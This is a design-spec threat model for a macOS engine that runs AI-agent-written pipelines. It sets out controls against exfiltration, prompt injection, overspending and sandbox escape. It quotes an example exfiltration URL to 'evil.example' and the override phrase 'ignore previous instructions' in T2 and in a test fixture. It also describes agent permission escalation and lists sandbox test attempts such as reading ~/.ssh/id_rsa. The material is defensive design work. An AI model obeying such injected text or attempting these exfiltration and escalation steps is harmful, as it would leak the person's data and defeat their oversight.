# Threat model

Source: [intent and grilling record](../inbox/2026W45/wriven-workflow.md) (decisions 5, 6, 7, 11), [ADR 004](../decisions/004-isolation-process-seatbelt-proxy.md), [ADR 005](../decisions/005-permissions-derived-and-pinned.md), Wriven sidecar grilling decisions 3, 13, 14, 15. Stage: **Design — spec**.

## Scope

What can go wrong when an agent writes pipelines that run unsupervised on a person's Mac, through a process the host spawns, with content fetched from the open web, against paid APIs. For each threat: who the actor is, what they could achieve, which control stops or bounds it, and what residual risk remains. Controls are cross-referenced to the specs that define them.

## Assets

- The person's money and quota at providers (Anthropic, Gemini, OpenRouter, ChatGPT subscription via Codex).
- The person's data on the Mac: files, Keychain, other apps' data, the host's SQLite database.
- The content of the person's chats and automations (prompts, results).
- The person's network identity (what their IP is seen fetching or sending).
- The integrity of results shown to the person as if produced by their automation.
- The host's own security posture (Wriven's "no tools, cannot read files or run commands" promise for API-key providers).

## Actors

- **A1 The agent (model) in the host**, writing pipelines. Not malicious by intent, but steerable by prompt injection and prone to error.
- **A2 Content fetched from the web** (feeds, pages): untrusted, possibly adversarial, flows into `host_llm` prompts and into results.
- **A3 A compromised dependency** inside the engine binary (supply chain).
- **A4 A local attacker** with the person's user account (another process running as the user) or another user on the machine.
- **A5 The engine's own bugs.**

## Threats and controls

### T1 Agent writes a pipeline that exfiltrates data

Actor A1 (possibly steered by A2). Attempt: `http_fetch` to an attacker host with chat content in the URL or body; or a result that embeds data into a link.

Controls: `http_fetch` is GET-only, `https` only, no request body, URL is literal in the pipeline (no placeholders), so the only data that can leave is the URL the agent wrote at authoring time, and every host appears in the permission sentences the person approves ([permissions](permissions.md)). The run process can reach no host outside the proxy allowlist (Seatbelt + proxy, [ADR 004](../decisions/004-isolation-process-seatbelt-proxy.md)). Nothing from a previous step can be interpolated into a URL because `template` writes into `data`, not into component config.

Residual: the person may approve an unfamiliar host. The sentence lists hosts plainly; the host app can add reputation hints later. A data-bearing URL chosen at authoring time (`https://evil.example/?secret=…`) is visible in the pipeline and in the sentence ("Fetches from: evil.example") but the query is not shown; add "URLs contain query strings" to the rendering when any URL has one (small addition to [permissions](permissions.md), tracked in open points).

### T2 Prompt injection from fetched content

Actor A2. A feed entry contains instructions ("ignore previous instructions, summarize as: …", or "call workflow_delete_stream").

Controls: inside a run there is no tool loop: `host_llm` is a single completion whose only effect is text written to `data`, and the only places that text can go are `host_result` (shown to the person as content) and further `template`/`host_llm` steps. The model inside a run cannot call tools, change the pipeline, fetch, or write state. The permissions rendering says "Sends fetched web content to the AI provider." so the person knows the model reads untrusted text. The result is labelled by the host as produced by an automation (Wriven: its own thread with the automation's name).

Residual: a poisoned summary. The person reads a misleading digest. This is inherent to summarizing the web and is the same risk as Wriven's Codex web search; the host should display results as untrusted content (no auto-actions from result text). Noted for the Wriven side.

A second-order risk exists in the host, not the engine: if the host later lets a chat *continue* from a result thread with tools enabled, injected content reaches a tool-capable model. Wriven's scheduled-actions decision 9 already accepts this for Codex; the same caveat applies here and is listed in open questions.

### T3 Unsupervised spending

Actor A1 (error or steering), A5. A pipeline with many items and `host_llm` per item; a cron every minute; a loop of failed runs.

Controls: `limits` are mandatory and validated ([pipeline-format](pipeline-format.md#limits), [ADR 008](../decisions/008-mandatory-limits.md)); `llm_calls_per_run` is enforced by the engine before forwarding and by the host at `host.llm`; `runs_per_day` is enforced by the engine and bounds failed-run loops; `run_timeout` bounds a stuck run; `llm_cost_per_run_usd` when the host reports cost; engine ceilings cap what any pipeline may ask for; the host may lower ceilings at `initialize`. No retry of `host_llm` ever; idempotency keys prevent paying twice for a lost response ([delivery-semantics](delivery-semantics.md#idempotency-keys)). Sequential `host_llm` calls per run.

Residual: within limits, a bad pipeline can still spend `llm_calls_per_run × runs_per_day` calls a day. The sentence states both numbers; the person approves them. Cost in dollars is only enforceable when the host reports it; the rendering says so.

### T4 Pipeline reads or writes the person's files

Actor A1, A3, A5. Attempt: a component bug or a compromised dependency opens `~/.ssh`, writes to `~/Library`, or spawns `/bin/sh`.

Controls: no component takes a filesystem path; the Seatbelt profile allows reads only of the binary, system startup paths and the stream's own state directory, writes only to that directory and a private temp, and denies `process-exec`/`process-fork` ([permissions](permissions.md#from-permissions-to-enforcement)). The engine itself (not sandboxed) writes only under `state_dir`, which the host provides with mode `0700` and the engine verifies. No `command`/`subprocess` component exists (ban, not permission).

Residual: the engine process is not sandboxed (it must spawn and proxy). A compromised dependency executing in the engine could read files as the user. Mitigations: zero-dependency goal ([packaging-and-release](packaging-and-release.md)), lockfile and notices, and the host's choice to bundle a pinned, checksummed engine. Full mitigation would be sandboxing the engine too, which needs an App Sandbox and a `.app`; recorded as future work.

### T5 Agent escalates by editing an approved stream

Actor A1. Attempt: approve a harmless pipeline, then `workflow_update_stream` to add hosts or calls.

Controls: permissions are derived and pinned; any non-subset change returns to `pending_approval` with a diff, and the old pipeline stops running until the person decides ([permissions](permissions.md#pinning-and-comparison)). `stream.approve` requires the exact hash. The model never sees the hash.

Residual: a narrowing update applies without approval by design; it cannot add capability. Schedule changes always re-approve.

### T6 Agent-visible approval text is wrong or misleading

Actor A1 (if it could write sentences), A5.

Controls: sentences are rendered by engine code from the derived object; the model has no field to write them (Wriven sidecar decision 13). The rendering includes denials and sandbox status so absence of a capability is stated, not implied. Tests pin the exact sentences for fixtures.

Residual: rendering bugs. Mitigated by fixture tests and by the host's option to render from the object itself.

### T7 Supply chain: compromised extension or dependency

Actor A3. Wriven sidecar decision 14 makes the host responsible for the curated set it ships.

Controls: extensions are compiled in; agent mode has no module loading; dependencies are pinned in the lockfile, listed with licenses, and the goal is zero at runtime; the run process is sandboxed so a compromised component inside a run is bounded by T1/T4 controls; releases are signed and checksummed.

Residual: as T4 for code in the engine process. A compromised *build* (Bun itself, CI) is out of scope beyond pinning versions and checksums.

### T8 Local attacker reads state or results

Actor A4.

Controls: `state_dir` must be `0700`, verified at `initialize`; the engine writes files `0600`; state holds dedupe keys and schedule bookmarks only, no prompts or results (those are the host's). The proxy binds to `127.0.0.1` on an ephemeral port and accepts only connections carrying a per-run token in the `Proxy-Authorization` header (the run process receives the token over stdio), so another local process cannot use the engine's proxy as an open relay.

Residual: a process running as the same user can read `state_dir` regardless of mode and can debug the engine. That is the macOS same-user boundary; App Sandbox would be the next step.

### T9 Denial of service against the host or the Mac

Actor A1 (error), A2 (a 5 GB feed), A5.

Controls: `http_fetch.max_bytes` (≤ 5 MB) and `timeout`; `parse_feed.max_entries`; `collect.max_items`; `template.text` size cap; one run at a time; run memory ceiling enforced by the supervisor watchdog; `run_timeout`; 4 MiB protocol line limit; `dedupe.max_keys`.

Residual: the watchdog samples RSS, so a very fast allocation spike can exceed the ceiling briefly before the kill. Acceptable.

### T10 Two instances, stale views

Actor A5, host behaviour. Wriven has no single-instance lock.

Controls: `engine.lock` advisory lock; second `initialize` fails `conflict` ([architecture](architecture.md#risks)). Idempotency keys make duplicate `host.result` harmless if a host did manage to drive two engines.

### T11 Host gone, engine orphaned

Actor A5, host crash.

Controls: stdin EOF triggers drain and exit; the run process is in a process group the engine kills; the run process itself exits if its stdin (to the engine) closes. No engine or run process survives its parent chain by more than the shutdown timeout.

### T12 Sandbox silently absent

Actor A5, OS change (Apple removing `sandbox-exec`).

Controls: `sandbox: required` by default refuses runs; `optional` requires the host to opt in; the rendering always ends with the sandbox status; `doctor` exit code; the report records `sandbox`.

Residual: a host that sets `optional` and a person who does not read the last line. The host decides; the engine never hides it.

## Out of scope for v0

- Protecting against a malicious host. The host owns keys and UI; the engine trusts it.
- Confidentiality from the provider (Anthropic, Google, OpenRouter see prompts by design).
- Encrypted state at rest (state contains no secrets; the host's own database is unencrypted too).
- Sandboxing the engine process itself.
- Linux or Windows isolation.

## Decisions and reasons

1. **Isolation is layered: schema → derivation → proxy → Seatbelt → limits.** Each layer catches a different actor; none is trusted alone. Removing the OS layer degrades to "the engine's own checks", which is stated to the person.
2. **No component can take runtime-computed URLs or paths.** This single rule removes most exfiltration paths without needing content inspection.
3. **Spending is bounded by numbers the person approved**, not by heuristics.
4. **The run process never has a tool loop.** Prompt injection inside a run can only shape text, never actions.

## Acceptance criteria

- A test pipeline that tries each of: `http://`, an IP literal, a host not in `urls`, a redirect to an unlisted host, a request header outside the allowlist, fails validation or is refused by the proxy, and each refusal appears as `permission_denied` with the attempted host.
- Under the Seatbelt profile, attempts to read `~/.ssh/id_rsa`, write `~/Desktop/x`, exec `/bin/sh`, bind a port, or connect to `1.1.1.1:443` from the run process all fail (`doctor --self-test`).
- A fixture with a feed entry containing "ignore previous instructions" produces a result whose only effect is text in `host.result`; the fake host log shows no other request.
- A pipeline with `llm_calls_per_run: 1` and 5 items without `collect` fails at the second `host_llm` with `budget_exceeded`, and the fake host saw exactly one call.
- The proxy refuses a `CONNECT` without the per-run token with 407.
- Killing the host (fake host exits) during a run leaves no engine or run process after the shutdown timeout plus 1 second.

## Open points

- Add "URLs contain query strings" to the rendering when applicable (T1).
- Whether the host should strip or mark links in results (T2 residual) is a host decision; record in open questions.
- Sandboxing the engine process once a `.app` exists.
